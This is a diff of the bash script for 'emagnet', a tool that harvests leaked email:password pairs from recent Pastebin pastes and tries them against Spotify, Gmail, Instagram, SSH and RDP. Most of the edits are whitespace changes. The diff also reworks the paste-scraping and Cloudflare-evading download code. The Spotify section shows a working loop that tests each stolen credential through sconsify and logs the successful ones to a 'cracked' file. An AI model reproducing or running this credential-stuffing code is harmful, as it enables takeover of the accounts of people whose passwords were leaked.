@@ -362,19 +362,19 @@ emagnet_analyzing_message() {
 if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
+    elif [[ "$PBRUTEFORCE" = "true" ]]; then
            printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
+    elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+    elif [[ "$IBRUTEFORCE" = "true" ]]; then
            printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
       elif [[ "$RBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  else
+    else
            sleep 0
 fi
     text="Analyzing..."
@@ -402,8 +402,8 @@ TOTP="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt|wc -l)"      # 
 TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # Total Urls
           emagnet_clear;emagnet_banner
           printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
-	      printf "%64s \n\n" | tr ' ' '='
-	      LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
+        printf "%64s \n\n" | tr ' ' '='
+        LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
            for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
             echo -e ",-> Merging logs from: $LOGDATE \n|"
             #logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-instagram-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
@@ -415,7 +415,7 @@ TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # 
                   printf "| %2d) [MERGED] %.100s %s\n" "$(( ++cnt ))" "$logs'"
                   sleep 1
                 else
-	          printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
+            printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
                   sleep 1
                 fi
                   done < $HOME/emagnet/.emagnet-temp-merge.txt
@@ -435,19 +435,19 @@ emagnet_banner
 if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
+    elif [[ "$PBRUTEFORCE" = "true" ]]; then
            printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
+    elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
+    elif [[ "$IBRUTEFORCE" = "true" ]]; then
            printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
           elif [[ "$RBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-	  else
+    else
            sleep 0
 fi
 
@@ -492,85 +492,85 @@ emagnet_count_down() {
             emagnet_conf
 
 if [[ "$GBRUTEFORCE" = "true" ]]; then
-       	    sed -i '125d' "$CONF"
-      	    sed -i '125 i GBRUTEFORCE=true' "$CONF"
-      	    sed -i '126d' "$CONF"
-      	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+            sed -i '125d' "$CONF"
+            sed -i '125 i GBRUTEFORCE=true' "$CONF"
+            sed -i '126d' "$CONF"
+            sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
-      	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
-     	      sed -i '128 i IBRUTEFORCE=false' "$CONF"
+            sed -i '128 i IBRUTEFORCE=false' "$CONF"
             sed -i '129d' "$CONF"
-     	      sed -i '129 i RBRUTEFORCE=false' "$CONF"     	    
+            sed -i '129 i RBRUTEFORCE=false' "$CONF"          
             emagnet_conf
             printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 
-	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
-      	    sed -i '125d' "$CONF"
-     	      sed -i '125 i GBRUTEFORCE=false' "$CONF"
-      	    sed -i '126d' "$CONF"
+    elif [[ "$SBRUTEFORCE" = "true" ]]; then
+            sed -i '125d' "$CONF"
+            sed -i '125 i GBRUTEFORCE=false' "$CONF"
+            sed -i '126d' "$CONF"
             sed -i '126 i SBRUTEFORCE=true' "$CONF"
             sed -i '127d' "$CONF"
-     	      sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
-     	      sed -i '128 i IBRUTEFORCE=false' "$CONF"
+            sed -i '128 i IBRUTEFORCE=false' "$CONF"
             sed -i '129d' "$CONF"
-     	      sed -i '129 i RBRUTEFORCE=false' "$CONF" 
+            sed -i '129 i RBRUTEFORCE=false' "$CONF" 
             emagnet_conf
             printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 
-	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
+    elif [[ "$PBRUTEFORCE" = "true" ]]; then
             sed -i '125d' "$CONF"
-     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
-      	    sed -i '126d' "$CONF"
-     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+          sed -i '125 i GBRUTEFORCE=false' "$CONF"
+            sed -i '126d' "$CONF"
+          sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
-     	    sed -i '127 i PBRUTEFORCE=true' "$CONF"
+          sed -i '127 i PBRUTEFORCE=true' "$CONF"
             sed -i '128d' "$CONF"
-     	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
+          sed -i '128 i IBRUTEFORCE=false' "$CONF"
             sed -i '129d' "$CONF"
-     	    sed -i '129 i RBRUTEFORCE=false' "$CONF" 
+          sed -i '129 i RBRUTEFORCE=false' "$CONF" 
             emagnet_conf
             printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 
-	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
-	          sed -i '125d' "$CONF"
-     	      sed -i '125 i GBRUTEFORCE=false' "$CONF"
-      	    sed -i '126d' "$CONF"
-     	      sed -i '126 i SBRUTEFORCE=false' "$CONF"
+    elif [[ "$IBRUTEFORCE" = "true" ]]; then
+            sed -i '125d' "$CONF"
+            sed -i '125 i GBRUTEFORCE=false' "$CONF"
+            sed -i '126d' "$CONF"
+            sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
-     	      sed -i '127 i PBRUTEFORCE=false' "$CONF"
+            sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
-     	      sed -i '128 i IBRUTEFORCE=true' "$CONF"
+            sed -i '128 i IBRUTEFORCE=true' "$CONF"
             sed -i '129d' "$CONF"
-     	      sed -i '129 i RBRUTEFORCE=false' "$CONF" 
+            sed -i '129 i RBRUTEFORCE=false' "$CONF" 
             emagnet_conf
             printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
 
-	  elif [[ "$RBRUTEFORCE" = "true" ]]; then
-	        sed -i '125d' "$CONF"
-     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
-      	    sed -i '126d' "$CONF"
-     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
+    elif [[ "$RBRUTEFORCE" = "true" ]]; then
+          sed -i '125d' "$CONF"
+          sed -i '125 i GBRUTEFORCE=false' "$CONF"
+            sed -i '126d' "$CONF"
+          sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
-     	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
+          sed -i '127 i PBRUTEFORCE=false' "$CONF"
             sed -i '128d' "$CONF"
-     	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
+          sed -i '128 i IBRUTEFORCE=false' "$CONF"
             sed -i '129d' "$CONF"
-     	    sed -i '129 i RBRUTEFORCE=true' "$CONF" 
+          sed -i '129 i RBRUTEFORCE=true' "$CONF" 
             emagnet_conf
             printf "%20s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
             emagnet_analyzer
-	  else
+    else
             emagnet_conf
             sed -i '125d' "$CONF"
             sed -i '125 i GBRUTEFORCE=false' "$CONF"
@@ -714,26 +714,26 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
     |cut -d':' -f2,3 \
     |cut -d'|' -f1 \
     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> "$SPOTIFY_TARGETS"
-	     while read line; do
-               	SPOTIFY_USER="$(echo $line|cut -d: -f1)"
-      	        SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
-	           ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
-	             if [[ "$?" -eq "0" ]]; then
-        	      echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
+       while read line; do
+                SPOTIFY_USER="$(echo $line|cut -d: -f1)"
+                SPOTIFY_PASS="$(echo $line|cut -d: -f2)"
+             ./sconsify -username="${SPOTIFY_USER}" <<< "${SPOTIFY_PASS}" 2> /dev/null|grep -i -q "bad"
+               if [[ "$?" -eq "0" ]]; then
+                echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
                else
 #                     grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" "$EMAGNETTEMP" \
 #                     |awk '{print $1}' \
 #                     |cut -d':' -f2,3 \
 #                     |cut -d'|' -f1 \
 #                     |uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v "/" >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt
-              	       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
-            	       echo -e "================================================================"      >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-             	       echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-              	       echo -e "[+]------------------------------------------------------------"       >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-             	       echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+                       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"
+                     echo -e "================================================================"      >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+                     echo -e "[+] Login Details For SPOTIFY - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"   >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+                       echo -e "[+]------------------------------------------------------------"       >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+                     echo -e "[+] Username: ${SPOTIFY_USER}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
                        echo -e "[+] Password: ${SPOTIFY_PASS}"                                         >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-             	       echo -e "================================================================\n\n"  >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
-               	       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
+                     echo -e "================================================================\n\n"  >>    "$EMAGNETCRACKED/cracked-spotify-passwords.txt"
+                       echo -e "[\e[1;32m>>\e[0m] - Cracked Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}" >>    "$HOME/.config/emagnet/tmp/.emagnet-cracked"
                        echo -e "[\e[1;31m<<\e[0m] - Wrong Password: ${SPOTIFY_USER}:${SPOTIFY_PASS}"   >>    "$HOME/.config/emagnet/tmp/.emagnet-failed"
               fi
             done < "$SPOTIFY_TARGETS"
@@ -768,10 +768,10 @@ GMAIL_PASS="$(echo $line | cut -d: -f2)"
          echo -e "================================================================\n\n" >>    "$EMAGNETCRACKED/cracked-gmail-passwords.txt"
       fi
 done < "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt"
-    	rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &> /dev/null
-    	sleep 3
+      rm "$HOME/.config/emagnet/tmp/.emagnet-passwords.txt" &> /dev/null
+      sleep 3
 else
-    	sleep 1
+      sleep 1
 fi
 }
 
@@ -875,15 +875,13 @@ fi
 # We now use nr1.nu instead for see recent uploads 
 # since patebin now have filtered default syntax 
 # "text" from being listed, lmao :) 
-  $CURL -sL -H "$USERAGENT" -Ls ${PASTEBIN}|cut -d/ -f4|grep -v "index\|raw" > "$HOME/.config/emagnet/tmp/.emagnet-temp1"
-  ls -1 $EMAGNETALL|sort > "$HOME/.config/emagnet/tmp/.emagnet-temp2"
-  cat "$HOME/.config/emagnet/tmp/.emagnet-temp1"|sort|awk '!seen[$0]++'|cut -d'/' -f4 > "$HOME/.config/emagnet/tmp/.emagnet-temp3"
-  grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp2" "$HOME/.config/emagnet/tmp/.emagnet-temp3"|awk -F, '!seen[$1]++' > "$HOME/.config/emagnet/tmp/.emagnet-download"
+  $CURL -sL -H "$USERAGENT" -Ls "${PASTEBIN}"|sort|awk '!seen[$0]++' > "$HOME/.config/emagnet/tmp/.emagnet-temp1"
+  ls -1 "$EMAGNETALL"|sort|awk '!seen[$0]++'|sed 's/^/https:\/\/pastebin.com\/raw\//g' > "$HOME/.config/emagnet/tmp/.emagnet-temp2"
+  # Before we can download stuff from pastebin, we must insert http://pastebin.com/raw/<file_name> in
+  # emagnet-download since we just want to download new files that not already is in our all-files
 
-# Before we can download stuff from pastebin, we must insert http://pastebin.com/raw/<file_name> in
-# emagnet-download since we just want to download new files that not already is in our all-files
-      sed -i 's/^/https:\/\/pastebin.com\/raw\//g' "$HOME/.config/emagnet/tmp/.emagnet-download"
-
+# Compare all files in our allfiles path with the new file so we know if there is any dupes, we just want new files
+  grep  -v -x -F -f "$HOME/.config/emagnet/tmp/.emagnet-temp1" "$HOME/.config/emagnet/tmp/.emagnet-temp2"|awk -F, '!seen[$1]++' > "$HOME/.config/emagnet/tmp/.emagnet-download"
 #-----------------------------------------------------
 # If cloudfare is trigged, then we will do below 
 # - We wont be allowed to use wget without
@@ -892,17 +890,19 @@ fi
 # change this if you have a faster, better and more 
 # stable way to do this if cloudfare is triggered
 #-----------------------------------------------------
+
 curl -sL https://pastebin.com/|grep -io "What can I do to" &> /dev/null
-if [[ "$?" -gt "0" ]]; then
+if [[ "$?" = "0" ]]; then
 while read line; do
-curl -sL $PASTEBIN \
+curl -sL $line \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H \
      -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' \
      -H 'Cookie: __cfduid=.....; cf_clearance=..; PHPSESSID=.....; _ga=....; _gid=.... __gads=ID=... _gat_UA-58643-34=1' \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'Cache-Control: max-age=0' \
      -H 'TE: Trailers' \
-     -o $EMAGNETTEMP/$(echo $line|sed 's:..*/::');done < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
+     -o $EMAGNETTEMP/$(echo $line|sed 's:..*/::');
+done < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
 else
 # Downloading new pastes we found, no duplicates will be downloaded of course
      xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
@@ -1034,7 +1034,7 @@ fi
 }
 
 emagnet_search() {
-	emagnet_required_tools
+  emagnet_required_tools
     dt="$(date +%d%m%y)"
     emagnet_conf
     emagnet_clear
@@ -1247,7 +1247,7 @@ case "${1}" in
         sed -i 's/IBRUTEFORCE=true/IBRUTEFORCE=false/g' "$CONF"
         sed -i 's/RBRUTEFORCE=true/RBRUTEFORCE=false/g' "$CONF"
         emagnet_run4ever
-		  ;;
+      ;;
       "-S"|"-search"|"--search")
            emagnet_conf
            emagnet_search
@@ -1498,7 +1498,7 @@ fi
                 ;;
 
         "-n"|"-notify"|"--notify")
-   	        emagnet_required_stuff
+            emagnet_required_stuff
             emagnet_conf
             which "notify-send" &> /dev/null
                 if [[ "$?" -gt "0" ]]; then echo -e "$basename$0: internal error -- notify-send is required to be installed";exit 1; fi
@@ -1563,10 +1563,10 @@ fi
               fi
                ;;
       
-	  "\?")
+    "\?")
               printf "emagnet: internal error -- use --help for available commands'\n\n"
               exit 1 ;;
-   	   "*")
+       "*")
               printf "emagnet: internal error -- use --help for available commands'\n\n"
               exit 1 ;;
 
